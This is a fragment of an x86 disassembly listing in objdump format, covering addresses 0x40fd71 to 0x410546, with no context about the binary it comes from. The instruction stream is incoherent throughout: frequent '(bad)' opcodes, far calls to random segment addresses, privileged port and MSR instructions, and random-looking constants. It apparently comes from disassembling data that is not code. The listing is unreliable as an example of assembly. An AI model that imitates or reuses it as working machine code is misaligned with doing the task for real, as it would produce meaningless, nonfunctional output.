  40fd71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd72:	scas   al,BYTE PTR es:[edi]
  40fd73:	iret   
  40fd74:	shr    ah,cl
  40fd76:	jne    0x40fd1a
  40fd78:	es or  esp,ebx
  40fd7b:	fmul   DWORD PTR [ebx-0x698651c]
  40fd81:	rcr    edi,cl
  40fd83:	test   eax,0x8b848262
  40fd88:	sbb    al,0xd4
  40fd8a:	mov    al,ds:0xc41c10d5
  40fd8f:	icebp  
  40fd90:	mov    eax,ds:0xe72369df
  40fd95:	jecxz  0x40fdb3
  40fd97:	shr    BYTE PTR [ebx+0x13447b74],1
  40fd9d:	js     0x40fd78
  40fd9f:	(bad)  
  40fda0:	(bad)  [esi+0x10d2285f]
  40fda6:	xor    eax,0x45ff7d2c
  40fdab:	mov    ch,0xc6
  40fdad:	inc    esp
  40fdae:	lahf   
  40fdaf:	(bad)
  40fdb3:	in     eax,dx
  40fdb4:	xchg   ebp,eax
  40fdb5:	outs   dx,BYTE PTR ds:[esi]
  40fdb6:	mov    bl,0x46
  40fdb8:	xor    cl,dl
  40fdba:	stos   DWORD PTR es:[edi],eax
  40fdbb:	sub    al,0xf8
  40fdbd:	sbb    ah,BYTE PTR [eax-0x74]
  40fdc0:	cmp    eax,0x55
  40fdc3:	rol    BYTE PTR [ebx+edi*1-0x4eb45598],0xaf
  40fdcb:	dec    edi
  40fdcc:	(bad)  
  40fdce:	mov    WORD PTR [edx+0x10eaeed6],?
  40fdd4:	call   0xecb6:0x7d747239
  40fddb:	addr16 popf 
  40fddd:	clc    
  40fdde:	xor    esp,DWORD PTR [eax+0x44]
  40fde1:	ficomp DWORD PTR [ecx+ebx*8+0x6f]
  40fde5:	jecxz  0x40fd8b
  40fde7:	popa   
  40fde8:	bound  edi,QWORD PTR [edx]
  40fdea:	call   DWORD PTR [eax-0x11]
  40fded:	js     0x40fe1a
  40fdef:	sbb    eax,0xc6173e19
  40fdf4:	add    DWORD PTR [ecx-0x5270708e],ecx
  40fdfa:	ja     0x40fe26
  40fdfc:	cmp    al,0x15
  40fdfe:	pop    ebp
  40fdff:	mov    ebp,0x635a4e25
  40fe04:	inc    ebp
  40fe05:	mul    BYTE PTR [esi+0x1ce0b958]
  40fe0b:	cwde   
  40fe0c:	aas    
  40fe0d:	and    cl,0x1f
  40fe10:	jmp    0x70954a34
  40fe15:	gs add cl,cl
  40fe18:	push   esi
  40fe19:	pushf  
  40fe1a:	xor    eax,0xa1ea66a8
  40fe1f:	lods   eax,DWORD PTR ds:[esi]
  40fe20:	add    eax,0x86990d7
  40fe25:	sub    al,0x62
  40fe27:	or     al,0x75
  40fe29:	jo     0x40fe2b
  40fe2b:	add    edx,DWORD PTR ds:0x45dfa1ad
  40fe31:	neg    BYTE PTR [ecx-0x34]
  40fe34:	repnz mov al,0x4c
  40fe37:	xchg   edi,eax
  40fe38:	enter  0x80f6,0xe9
  40fe3c:	cmp    bh,dh
  40fe3e:	mov    esi,0xbdbd160b
  40fe43:	or     ebx,esp
  40fe45:	scas   eax,DWORD PTR es:[edi]
  40fe46:	mov    dh,0xf4
  40fe48:	or     eax,0x4c77cb41
  40fe4d:	inc    ebx
  40fe4e:	ds cld 
  40fe50:	mov    eax,0x9637815e
  40fe56:	xchg   edx,ecx
  40fe58:	and    bh,BYTE PTR [ecx+0xa31e2dc]
  40fe5e:	cwde   
  40fe5f:	cs xchg ebx,eax
  40fe62:	adc    DWORD PTR [ecx],edi
  40fe64:	ins    DWORD PTR es:[edi],dx
  40fe65:	xchg   edi,eax
  40fe66:	push   ebx
  40fe67:	ret    0x1e6f
  40fe6a:	push   ds
  40fe6b:	stos   BYTE PTR es:[edi],al
  40fe6c:	adc    ch,BYTE PTR [edi+edx*4-0x48]
  40fe70:	or     eax,0x85435da5
  40fe75:	xor    BYTE PTR [eax-0x64e30948],dl
  40fe7b:	sub    bl,BYTE PTR [ebp-0x71]
  40fe7e:	icebp  
  40fe7f:	add    DWORD PTR [eax],edi
  40fe81:	inc    ecx
  40fe82:	or     ebp,ebx
  40fe84:	call   0xe352:0x7ceaa6a
  40fe8b:	outs   dx,BYTE PTR ds:[esi]
  40fe8c:	push   edx
  40fe8d:	dec    ecx
  40fe8e:	stos   BYTE PTR es:[edi],al
  40fe8f:	lds    edx,FWORD PTR [ebp-0x2b5fd8dd]
  40fe95:	mov    al,0xbd
  40fe97:	mov    bl,0x65
  40fe99:	xor    edx,DWORD PTR [ebx+0x79d883be]
  40fe9f:	xor    ecx,esi
  40fea1:	jle    0x40ff13
  40fea3:	mov    ecx,0xdabf8a3e
  40fea8:	jae    0x40fe38
  40feaa:	nop
  40feab:	mov    ebp,0xa1373f3c
  40feb0:	xor    eax,DWORD PTR [ecx]
  40feb2:	test   DWORD PTR [esp+edx*8+0x52],edi
  40feb6:	pop    ds
  40feb7:	mov    esi,0x18194283
  40febc:	imul   dl
  40febe:	and    BYTE PTR [edi],ch
  40fec0:	dec    edx
  40fec1:	cwde   
  40fec2:	outs   dx,DWORD PTR ds:[esi]
  40fec3:	mov    edx,esi
  40fec5:	in     eax,0x2
  40fec7:	or     eax,0xb8919017
  40fecc:	xchg   ebp,eax
  40fecd:	xor    edx,DWORD PTR [ebx]
  40fecf:	dec    edx
  40fed0:	test   al,0x31
  40fed2:	(bad)
  40fed5:	ins    BYTE PTR es:[edi],dx
  40fed6:	xor    DWORD PTR [ebp-0x79],ecx
  40fed9:	mov    eax,ds:0x5c047203
  40fede:	cs jno 0x40fe6b
  40fee1:	or     al,0x5
  40fee4:	mov    DWORD PTR [ecx-0x18],esi
  40fee7:	jno    0x40ff31
  40fee9:	ret    
  40feea:	push   0xffffffc8
  40feec:	adc    edx,ecx
  40feee:	dec    edx
  40feef:	data16 arpl cx,cx
  40fef2:	push   ds
  40fef3:	pop    ecx
  40fef4:	dec    edx
  40fef5:	and    cl,BYTE PTR [edx+0x24]
  40fef8:	addr16 add al,0xc5
  40fefb:	scas   al,BYTE PTR es:[edi]
  40fefc:	(bad)  
  40fefd:	jg     0x40ff69
  40feff:	pop    ecx
  40ff00:	inc    BYTE PTR [ecx]
  40ff02:	or     al,0x7f
  40ff04:	in     al,dx
  40ff05:	push   edi
  40ff06:	or     dl,BYTE PTR [edx-0x7d]
  40ff09:	test   BYTE PTR [ecx-0x5c],cl
  40ff0c:	retf   
  40ff0d:	jecxz  0x40ff19
  40ff0f:	xor    DWORD PTR [esi],ebp
  40ff11:	mov    ah,0x31
  40ff13:	int3   
  40ff14:	frstor [esi]
  40ff16:	popf   
  40ff17:	test   eax,0xb81b405
  40ff1c:	sub    eax,0xeacc96c4
  40ff21:	pop    eax
  40ff22:	cwde   
  40ff23:	pop    ebx
  40ff24:	repz inc ebx
  40ff26:	and    bh,cl
  40ff28:	test   esi,ebp
  40ff2a:	add    DWORD PTR [edi],esi
  40ff2c:	out    0xfa,al
  40ff2e:	xchg   edx,eax
  40ff2f:	jmp    0xe096:0x9359bf1
  40ff36:	ds jp  0x40ff41
  40ff39:	push   eax
  40ff3a:	loop   0x40ff81
  40ff3c:	out    dx,eax
  40ff3d:	cmp    dh,bh
  40ff3f:	(bad)  
  40ff40:	cmp    DWORD PTR [ecx],esi
  40ff42:	ds cmp eax,0xf7830b7d
  40ff48:	sar    DWORD PTR [edi+0x67e33373],cl
  40ff4e:	push   eax
  40ff4f:	aaa    
  40ff50:	std    
  40ff51:	outs   dx,BYTE PTR ds:[esi]
  40ff52:	stos   BYTE PTR es:[edi],al
  40ff53:	fwait
  40ff54:	popa   
  40ff55:	inc    esp
  40ff56:	cdq    
  40ff57:	adc    eax,DWORD PTR [edi-0x77]
  40ff5a:	adc    DWORD PTR [eax],ecx
  40ff5c:	fiadd  WORD PTR [edi+0x4d405da7]
  40ff62:	dec    esp
  40ff63:	and    BYTE PTR [ebp+ebp*1-0x65b2a220],ch
  40ff6a:	pop    eax
  40ff6b:	pop    es
  40ff6c:	dec    ecx
  40ff6d:	jmp    0x39782ba2
  40ff72:	jae    0x40ffb4
  40ff74:	mov    ebx,0xb6259275
  40ff79:	in     eax,dx
  40ff7a:	add    al,0xd6
  40ff7c:	frstor [eax]
  40ff7e:	cmp    al,0xb
  40ff80:	fcmovnb st,st(2)
  40ff82:	mov    al,ds:0x23fe3ecb
  40ff87:	jne    0x40ff25
  40ff89:	cdq    
  40ff8a:	pop    edi
  40ff8b:	or     bl,ch
  40ff8d:	jo     0x40ff18
  40ff8f:	push   eax
  40ff90:	and    ah,BYTE PTR [ecx-0x9]
  40ff93:	popf   
  40ff94:	test   eax,0x635b7b4
  40ff99:	jmp    0x40ffb2
  40ff9b:	js     0x41000f
  40ff9d:	mov    WORD PTR [ebx+eax*1+0x3a],?
  40ffa1:	ins    DWORD PTR es:[edi],dx
  40ffa2:	repnz imul ecx,ebp,0x7446c801
  40ffa9:	fadd   DWORD PTR cs:[ebx-0x79]
  40ffad:	or     ebx,edx
  40ffaf:	dec    esp
  40ffb0:	loopne 0x40ff63
  40ffb2:	pop    ecx
  40ffb3:	and    edi,0x1f3bcea7
  40ffb9:	cmp    esp,esp
  40ffbb:	xchg   esi,eax
  40ffbc:	mov    cl,BYTE PTR [ecx-0x647122da]
  40ffc2:	icebp  
  40ffc3:	(bad)  
  40ffc4:	jecxz  0x40ffad
  40ffc6:	sar    BYTE PTR [esp+esi*2+0x8ebdddc],0x44
  40ffce:	push   esi
  40ffcf:	outs   dx,BYTE PTR ds:[esi]
  40ffd0:	mov    ebx,0x9cac4e37
  40ffd5:	bound  ecx,QWORD PTR [esi+0x5e]
  40ffd8:	mov    ?,WORD PTR [ebx]
  40ffda:	dec    esi
  40ffdb:	push   ebp
  40ffdc:	mov    eax,0x1be1a16e
  40ffe1:	out    dx,al
  40ffe2:	xor    DWORD PTR [eax],ebx
  40ffe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe5:	sbb    al,0x9b
  40ffe7:	mov    al,0x82
  40ffe9:	pop    ecx
  40ffea:	iret   
  40ffeb:	dec    esi
  40ffec:	xlat   BYTE PTR ds:[ebx]
  40ffed:	cld    
  40ffee:	xlat   BYTE PTR ds:[ebx]
  40ffef:	sahf   
  40fff0:	int    0x62
  40fff2:	cmc    
  40fff3:	das    
  40fff4:	jge    0x41000f
  40fff6:	stc    
  40fff7:	push   es
  40fff8:	jmp    0xf656:0x2f758dc
  40ffff:	fwait
  410000:	inc    esi
  410001:	or     BYTE PTR [esi-0x4e],al
  410004:	sbb    edx,0xffffff85
  410007:	add    BYTE PTR [ebp-0x57],al
  41000a:	leave  
  41000b:	jge    0x40fff9
  41000d:	pop    ss
  41000e:	(bad)  
  41000f:	pop    esp
  410010:	cmp    DWORD PTR [esi],0xffffff9d
  410013:	es scas eax,DWORD PTR es:[edi]
  410015:	mov    al,ds:0x94cef4df
  41001a:	lds    ebx,FWORD PTR [ebp+0x11]
  41001d:	ins    BYTE PTR es:[edi],dx
  41001e:	sti    
  41001f:	dec    esi
  410020:	das    
  410021:	cmp    bl,BYTE PTR [eax+0x76d35089]
  410027:	icebp  
  410028:	xor    ecx,eax
  41002a:	sbb    DWORD PTR [ebp-0x7be436c6],0x16ede6da
  410034:	xchg   edx,eax
  410035:	fwait
  410036:	out    dx,al
  410037:	push   cx
  410039:	xchg   edi,eax
  41003a:	sbb    DWORD PTR [ebx],eax
  41003c:	jae    0x410010
  41003e:	cmp    eax,0x93531a22
  410043:	xor    eax,0x1870d2cf
  410048:	inc    edi
  410049:	dec    edi
  41004a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41004b:	mov    ecx,0xb2566d0a
  410050:	bound  edi,QWORD PTR [eax-0x32]
  410053:	or     al,0x40
  410055:	int    0x30
  410057:	sub    esi,DWORD PTR [esi]
  410059:	cs ret 
  41005b:	xor    esp,esp
  41005d:	pop    eax
  41005e:	xchg   BYTE PTR [edx-0x59],ch
  410061:	push   esp
  410062:	xor    al,0x6
  410064:	stos   DWORD PTR es:[edi],eax
  410065:	pop    edi
  410066:	cmp    eax,DWORD PTR [ebx-0x529f5f3d]
  41006c:	pop    ds
  41006d:	neg    DWORD PTR [ecx-0x75f06273]
  410073:	add    DWORD PTR [ebp+0x46fc73e0],ebx
  410079:	ds sub bh,dl
  41007c:	mov    bh,0xab
  41007e:	mov    ebp,0xe49f6608
  410083:	js     0x41009d
  410085:	cdq    
  410086:	cmp    esi,DWORD PTR [edx+0x20]
  410089:	push   ebx
  41008a:	in     al,0x55
  41008c:	jge    0x41007d
  41008e:	in     al,0xcc
  410090:	nop
  410091:	hlt    
  410092:	repnz pop esi
  410094:	sbb    BYTE PTR [esi+0x5c],0x53
  410098:	or     al,0xa4
  41009a:	push   esi
  41009b:	or     DWORD PTR [ecx+0x38e87dfc],esi
  4100a1:	arpl   WORD PTR [edi+0x46],ax
  4100a4:	inc    esi
  4100a5:	jge    0x4100e8
  4100a7:	mov    edi,ebp
  4100a9:	xchg   edi,eax
  4100aa:	pop    edx
  4100ab:	retf   0xa512
  4100ae:	push   0x2b
  4100b0:	jge    0x410057
  4100b2:	leave  
  4100b3:	sbb    eax,0x7ec8684c
  4100b8:	ins    BYTE PTR es:[edi],dx
  4100b9:	dec    esp
  4100ba:	lock dec esi
  4100bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100bd:	std    
  4100be:	ja     0x41010a
  4100c0:	pop    es
  4100c1:	call   0xf4a6147c
  4100c6:	cdq    
  4100c7:	mov    esp,0xc0481c05
  4100cc:	jmp    0x2b63d914
  4100d1:	mov    cl,0x3b
  4100d3:	inc    ebx
  4100d4:	inc    edx
  4100d5:	pop    ebx
  4100d6:	pushf  
  4100d7:	or     BYTE PTR [ebp-0x10],al
  4100da:	bnd jns 0x410096
  4100dd:	gs pop es
  4100df:	mov    ah,0x44
  4100e1:	retf   
  4100e2:	or     ch,BYTE PTR [eax+0x7c]
  4100e5:	jne    0x410071
  4100e7:	inc    esp
  4100e8:	mov    al,ds:0xc6f89bd1
  4100ed:	jmp    0x41015b
  4100ef:	fdiv   st,st(0)
  4100f1:	jo     0x4100df
  4100f3:	popf   
  4100f4:	hlt    
  4100f5:	bound  ebp,QWORD PTR [ebx-0x6aadb000]
  4100fb:	mov    ds:0xb1d2569f,al
  410100:	or     bh,BYTE PTR [eax]
  410102:	sub    al,0x8d
  410104:	dec    eax
  410105:	in     eax,0x53
  410107:	push   es
  410108:	js     0x41012d
  41010a:	(bad)  
  41010b:	aas    
  41010c:	sbb    BYTE PTR [edi+0x781e883e],dh
  410112:	aaa    
  410113:	nop
  410114:	in     eax,0xdb
  410116:	ja     0x41014c
  410118:	inc    esi
  410119:	data16 jnp 0x410159
  41011c:	jnp    0x410195
  41011e:	ja     0x41010d
  410120:	mov    ?,WORD PTR [esi+0x61b00249]
  410126:	cli    
  410127:	ins    BYTE PTR es:[edi],dx
  410128:	jmp    0x41018c
  41012a:	cld    
  41012b:	out    dx,al
  41012c:	inc    ebp
  41012d:	and    BYTE PTR [esi],bl
  41012f:	loope  0x410130
  410131:	dec    ebp
  410132:	sub    eax,0xc110bcd0
  410137:	gs aas 
  410139:	xchg   edi,eax
  41013a:	inc    ebp
  41013b:	pop    esi
  41013c:	call   0x1731:0x412b50b
  410143:	mov    edx,0x54b9ef08
  410148:	jecxz  0x410109
  41014a:	jb     0x4101b6
  41014c:	popf   
  41014d:	push   ecx
  41014e:	test   DWORD PTR [ecx+eiz*8+0x27],edx
  410152:	add    al,0xc9
  410154:	jmp    0xe8bc:0xeaf8f185
  41015b:	xlat   BYTE PTR ds:[ebx]
  41015c:	or     ebx,DWORD PTR [edx-0x42]
  41015f:	push   0x4f
  410161:	mov    esi,0xe82a9e5d
  410166:	out    0x70,al
  410168:	je     0x410146
  41016a:	fsubr  QWORD PTR [esp+esi*1]
  41016d:	(bad)  
  41016e:	jmp    0x5e51:0xbd133e8d
  410175:	mov    ds:0x958d3624,al
  41017a:	jp     0x4101ac
  41017c:	pop    ebp
  41017d:	scas   al,BYTE PTR es:[edi]
  41017e:	in     al,dx
  41017f:	jge    0x4101db
  410181:	nop
  410182:	bswap  edx
  410184:	ss repnz imul esi,ebp,0x7912a152
  41018c:	fxch   st(7)
  41018e:	pop    ds
  41018f:	ret    0xaace
  410192:	(bad)  
  410193:	icebp  
  410194:	pop    esi
  410195:	jo     0x410215
  410197:	xchg   esi,eax
  410198:	test   BYTE PTR [edx],ah
  41019a:	(bad)  
  41019b:	(bad)  
  41019c:	pop    esp
  41019d:	loope  0x4101de
  41019f:	cwde   
  4101a0:	(bad)  
  4101a1:	mov    ds:0x99291724,eax
  4101a6:	mov    al,ds:0x1768bc13
  4101ab:	dec    ebp
  4101ac:	loopne 0x410171
  4101ae:	push   0xffffffb6
  4101b0:	jo     0x5386fdb4
  4101b6:	iret   
  4101b7:	or     DWORD PTR [edi-0x5f1c9f5f],ebx
  4101bd:	js     0x4101e5
  4101bf:	das    
  4101c0:	xchg   esi,eax
  4101c1:	push   eax
  4101c2:	dec    ecx
  4101c3:	adc    al,0xe6
  4101c5:	adc    eax,DWORD PTR [ebx+ecx*1]
  4101c8:	cmp    bh,BYTE PTR [esi+0x47]
  4101cb:	test   DWORD PTR [esi],0x69db7f27
  4101d1:	add    cl,bl
  4101d3:	sbb    al,0x73
  4101d5:	aas    
  4101d6:	and    ecx,DWORD PTR [edx-0x491a7efb]
  4101dc:	sbb    esp,DWORD PTR [esi]
  4101de:	fdiv   DWORD PTR [eax+0x706b50c0]
  4101e4:	(bad)  
  4101e5:	test   BYTE PTR [ebx-0x56],cl
  4101e8:	xor    dh,BYTE PTR [esi+0x1cee4428]
  4101ee:	dec    ecx
  4101ef:	adc    bl,ch
  4101f1:	cmp    DWORD PTR [ebp-0x31],esp
  4101f4:	js     0x4101af
  4101f6:	ins    DWORD PTR es:[edi],dx
  4101f7:	cwde   
  4101f8:	out    0x9,eax
  4101fa:	sbb    eax,0x4b9fc5bf
  4101ff:	push   ebp
  410200:	add    cl,BYTE PTR [eax-0x7d53d885]
  410206:	add    bl,BYTE PTR [ebp+0xb8449a1]
  41020c:	inc    ebp
  41020d:	or     eax,0x5c9f5659
  410212:	fadd   QWORD PTR [edi-0x7c]
  410215:	int3   
  410216:	pop    es
  410217:	mov    ebp,0x7f42a930
  41021c:	push   ecx
  41021d:	into   
  41021e:	sbb    ch,BYTE PTR [esi+ebp*8-0x7]
  410222:	clc    
  410223:	inc    edi
  410224:	pop    esi
  410225:	or     cl,BYTE PTR [eax-0x6300dddf]
  41022b:	popf   
  41022c:	dec    esp
  41022d:	ja     0x410251
  41022f:	xchg   esp,eax
  410230:	out    0x6d,eax
  410232:	popf   
  410233:	aas    
  410234:	dec    edx
  410235:	xor    al,0x4a
  410237:	and    BYTE PTR [eax+0x54c317ac],bl
  41023d:	dec    esp
  41023e:	(bad)  
  41023f:	stc    
  410240:	pop    ds
  410241:	pop    esi
  410242:	gs jl  0x410243
  410245:	call   0xb45d7ca
  41024a:	in     al,0x2f
  41024c:	or     DWORD PTR [ecx-0x30],0xa8b65bed
  410253:	js     0x410266
  410255:	and    DWORD PTR [ebp+0x60231882],0xffffffda
  41025c:	or     esi,DWORD PTR [edx+0x31749314]
  410262:	mov    ebp,0x6ba1a1d9
  410267:	shl    DWORD PTR [ecx-0x77],0x58
  41026b:	xor    BYTE PTR gs:[eax],al
  41026e:	fwait
  41026f:	and    ecx,edi
  410271:	xchg   cl,dh
  410273:	sar    DWORD PTR [edi],1
  410275:	fisttp WORD PTR [edi+0x7b]
  410278:	and    al,0x33
  41027a:	cmp    cl,BYTE PTR [esi]
  41027c:	jne    0x410242
  41027e:	jmp    0x41025f
  410280:	std    
  410281:	cs nop
  410283:	xor    al,0x89
  410285:	cmp    edi,DWORD PTR [ebx-0x1b461ff0]
  41028b:	test   eax,0xd4b53565
  410290:	pop    ebx
  410291:	mov    al,BYTE PTR [eax+0x6469d184]
  410297:	mov    esp,0x51e38a63
  41029c:	bound  edi,QWORD PTR [edx+ebp*8]
  41029f:	repnz pop eax
  4102a1:	lods   eax,DWORD PTR ds:[esi]
  4102a2:	mov    esi,0xcfee8d6d
  4102a7:	ja     0x4102e3
  4102a9:	jne    0x4102f5
  4102ab:	ss xchg edi,eax
  4102ad:	cmp    eax,0xacd8bdcb
  4102b2:	mov    bh,BYTE PTR [esi]
  4102b4:	xchg   edx,eax
  4102b5:	adc    eax,ebp
  4102b7:	mov    al,ds:0xdb625756
  4102bc:	add    BYTE PTR [ebx+0x8b08f34],al
  4102c2:	shl    BYTE PTR [ecx],0x69
  4102c5:	pushf  
  4102c6:	add    bh,dh
  4102c8:	je     0x410303
  4102ca:	lock add ecx,DWORD PTR [edx-0x41f16833]
  4102d1:	in     eax,0x14
  4102d3:	pop    ss
  4102d4:	sub    al,0xeb
  4102d6:	retf   0xbc05
  4102d9:	adc    al,0x45
  4102db:	pop    edx
  4102dc:	lds    ebx,FWORD PTR [edx+0x4d]
  4102df:	dec    edi
  4102e0:	mov    ebx,0xc04ad03b
  4102e5:	jl     0x4102b5
  4102e7:	inc    eax
  4102e8:	stos   DWORD PTR es:[edi],eax
  4102e9:	out    dx,eax
  4102ea:	xor    al,0xb6
  4102ec:	scas   al,BYTE PTR es:[edi]
  4102ed:	lods   al,BYTE PTR ds:[esi]
  4102ee:	std    
  4102ef:	push   ebp
  4102f0:	js     0x410319
  4102f2:	push   0x14
  4102f4:	ds pop ebx
  4102f6:	adc    DWORD PTR [ebx],ebx
  4102f8:	rcr    DWORD PTR [ecx],0xc2
  4102fb:	cli    
  4102fc:	jno    0x41032c
  4102fe:	ss push ebp
  410300:	xor    BYTE PTR [edi-0x57],0x64
  410304:	jne    0x4102f8
  410306:	mov    ebp,0x46863560
  41030b:	aaa    
  41030c:	push   es
  41030d:	add    eax,0x7a990d21
  410312:	ss inc eax
  410314:	mov    eax,0x1f7c0135
  410319:	sar    DWORD PTR [eax],1
  41031b:	and    eax,0xe0bc519c
  410320:	or     BYTE PTR ds:0x4471350e,bh
  410326:	pop    esp
  410327:	dec    eax
  410328:	or     edx,ebx
  41032a:	sbb    BYTE PTR [ebx-0x526e2710],bl
  410330:	imul   edi,DWORD PTR [ebp+0x23],0x7d
  410334:	mov    ah,0xea
  410336:	push   ebp
  410337:	call   0xef44:0xebdfe556
  41033e:	inc    esp
  41033f:	ins    BYTE PTR es:[edi],dx
  410340:	add    al,0x23
  410342:	push   esi
  410343:	lds    esp,FWORD PTR [edi+0xafabeeb]
  410349:	std    
  41034a:	add    DWORD PTR [edx+ebp*1+0x4],esi
  41034e:	std    
  41034f:	lods   al,BYTE PTR ds:[esi]
  410350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410351:	mov    eax,ds:0xfa89e489
  410356:	sbb    BYTE PTR [esi+0x5b42a82a],dl
  41035c:	test   DWORD PTR [ecx+edx*2-0x25947d84],ebx
  410363:	loop   0x41033f
  410365:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410366:	pop    eax
  410367:	leave  
  410368:	ret    0xf5f4
  41036b:	sbb    BYTE PTR [edx+0x47],ch
  41036e:	mov    dh,0x5b
  410370:	jb     0x410390
  410372:	imul   ebp,DWORD PTR [edi-0x1f],0x1a224df5
  410379:	mov    ecx,0x32c3cd76
  41037e:	aad    0xef
  410380:	xor    eax,0x877a051c
  410385:	cmc    
  410386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410387:	cwde   
  410388:	std    
  410389:	cdq    
  41038a:	push   cs
  41038b:	push   eax
  41038c:	push   ebx
  41038d:	lea    ebx,ds:0x5e0fdee6
  410393:	shl    DWORD PTR [eax],cl
  410395:	and    DWORD PTR [edi-0x6f05b75c],edi
  41039b:	pop    ebx
  41039c:	(bad)  
  41039d:	lods   al,BYTE PTR ds:[esi]
  41039e:	ss dec ebx
  4103a0:	rcr    BYTE PTR gs:[edx-0x28e0d0c1],1
  4103a7:	cwde   
  4103a8:	inc    eax
  4103a9:	(bad)  
  4103aa:	aas    
  4103ab:	sbb    esp,DWORD PTR [esi+0x5f]
  4103ae:	mov    ds:0xcce98ea,eax
  4103b3:	sub    eax,0x4bc9ee2c
  4103b8:	call   0xdedf:0xf223c24b
  4103bf:	enter  0x6a5d,0x10
  4103c3:	push   ss
  4103c4:	arpl   WORD PTR [edx-0x4a9e67e8],si
  4103ca:	wrmsr  
  4103cc:	dec    ebx
  4103cd:	mov    esi,DWORD PTR [esi+0x10e78bcd]
  4103d3:	(bad)
  4103d6:	inc    ebx
  4103d7:	push   ss
  4103d8:	mov    bh,0x9
  4103da:	jae    0x4103b4
  4103dc:	pop    ds
  4103dd:	sbb    eax,0x876052d6
  4103e2:	sbb    BYTE PTR [ecx+ebx*8-0xb],ah
  4103e6:	retf   0x96aa
  4103e9:	scas   eax,DWORD PTR es:[edi]
  4103ea:	out    0xcf,al
  4103ec:	xor    BYTE PTR [ebx+0x729e1c34],bh
  4103f2:	xor    bl,BYTE PTR [ebx+0x12]
  4103f5:	sbb    eax,esi
  4103f7:	imul   ebp,esp,0xb496941f
  4103fd:	mov    ebp,DWORD PTR gs:[ecx]
  410400:	psubsw mm3,QWORD PTR [ebp-0x2c07fd2a]
  410407:	cmp    al,0x13
  410409:	into   
  41040a:	adc    dl,dl
  41040c:	jb     0x410447
  41040e:	pop    ecx
  41040f:	mov    ss,WORD PTR [esi-0x44b2a222]
  410415:	das    
  410416:	cmp    bl,BYTE PTR ds:0x2551250c
  41041c:	fdivr  st,st(0)
  41041e:	xchg   ebp,eax
  41041f:	les    edx,FWORD PTR [edi-0x62ee65d1]
  410425:	into   
  410426:	(bad)  [esi+0x28c6c8ff]
  41042c:	cmc    
  41042d:	nop
  41042e:	sar    DWORD PTR [edi-0x38210f72],cl
  410434:	mov    esi,0x667ce134
  410439:	lods   al,BYTE PTR cs:[esi]
  41043b:	push   eax
  41043c:	inc    esi
  41043d:	xchg   esi,eax
  41043e:	xchg   BYTE PTR [eax],dl
  410440:	mov    ds:0x13d4b905,al
  410445:	cmp    eax,0xa93696c3
  41044a:	mov    bh,0x73
  41044c:	cdq    
  41044d:	and    eax,0x2f03f591
  410452:	daa    
  410453:	inc    ecx
  410454:	out    0xec,eax
  410456:	xchg   ebp,eax
  410457:	(bad)  
  410458:	mov    ebp,DWORD PTR [edx]
  41045a:	jns    0x4104cc
  41045c:	lods   eax,DWORD PTR ds:[esi]
  41045d:	in     al,0xea
  41045f:	lock mov DWORD PTR [eax-0x16],ecx
  410463:	and    eax,0x6c10e8e9
  410468:	sub    bh,BYTE PTR [edi-0x38a0770d]
  41046e:	or     DWORD PTR [esi-0x6bfac288],ebp
  410474:	bound  edi,QWORD PTR [ebx+0x73]
  410477:	inc    ecx
  410478:	inc    ebp
  410479:	mov    eax,0x199bbddb
  41047e:	jge    0x410470
  410480:	stos   DWORD PTR es:[edi],eax
  410481:	mov    BYTE PTR [ebx],dh
  410483:	loope  0x41047d
  410485:	mov    al,ds:0x2f9f217
  41048a:	push   ebx
  41048b:	xchg   edi,eax
  41048c:	jne    0x4104e5
  41048e:	imul   ecx,DWORD PTR [esi-0x29],0x2b0d3ba2
  410495:	cdq    
  410496:	xchg   edi,eax
  410497:	mov    BYTE PTR [eax+0x19],al
  41049a:	daa    
  41049b:	cmp    edi,DWORD PTR [edx+0x49e3ab65]
  4104a1:	push   ebx
  4104a2:	jle    0x41046d
  4104a4:	call   0xb029a5e3
  4104a9:	scas   eax,DWORD PTR es:[edi]
  4104aa:	out    dx,al
  4104ab:	gs and eax,0x5a76b86
  4104b1:	push   edx
  4104b2:	test   eax,0xfbb8b265
  4104b7:	sub    al,0x12
  4104b9:	into   
  4104ba:	inc    ebx
  4104bb:	push   eax
  4104bc:	mov    cl,0xae
  4104be:	jle    0x410446
  4104c0:	dec    edx
  4104c1:	imul   ebp,DWORD PTR [eax-0x7433687b],0xffffffb0
  4104c8:	jns    0x41047b
  4104ca:	add    BYTE PTR [esi-0x108216d1],bh
  4104d0:	xor    ebx,DWORD PTR [ebx-0x317f1595]
  4104d6:	sbb    ebp,DWORD PTR [eax+0x2fd86b1f]
  4104dc:	cmp    eax,0x5881b220
  4104e1:	ss nop
  4104e3:	cmp    ebx,edi
  4104e5:	hlt    
  4104e6:	rcl    edi,cl
  4104e8:	mov    edi,0xb51a1f92
  4104ed:	outs   dx,BYTE PTR ds:[esi]
  4104ee:	mov    ch,0x2b
  4104f0:	jl     0x410546
  4104f2:	not    BYTE PTR [esi]
  4104f4:	pop    edx
  4104f5:	xchg   ecx,eax
  4104f6:	inc    ebp
  4104f7:	cmp    ecx,edi
  4104f9:	xchg   esi,eax
  4104fa:	and    al,0xdf
  4104fc:	pop    esp
  4104fd:	mov    ch,0xfc
  4104ff:	(bad)  
  410500:	leave  
  410501:	test   DWORD PTR [eax-0x78],0x2f2cef6
  410508:	test   eax,0x311c7a7e
  41050d:	rcr    BYTE PTR [ebp-0xd],cl
  410510:	cli    
  410511:	int3   
  410512:	cmp    DWORD PTR gs:[eax+0x20],eax
  410516:	jp     0x4104e1
  410518:	xchg   ebp,eax
  410519:	fwait
  41051a:	add    eax,ebp
  41051c:	js     0x410556
  41051e:	xchg   edx,eax
  41051f:	adc    eax,0xee3d98f0
  410524:	unpckhps xmm4,XMMWORD PTR [ecx+0x5a]
  410528:	dec    esi
  410529:	mov    ds:0xf784a299,eax
  41052e:	adc    DWORD PTR [edi],esi
  410530:	xor    BYTE PTR [esi+0x2075d2ce],ch
  410536:	jge    0x410561
  410538:	bound  edx,QWORD PTR ds:0x688233d3
  41053e:	push   ebp
  41053f:	out    0x58,al
  410541:	jbe    0x410570
  410543:	or     edi,ebx
  410545:	scas   eax,DWORD PTR es:[edi]
  410546:	push   edi
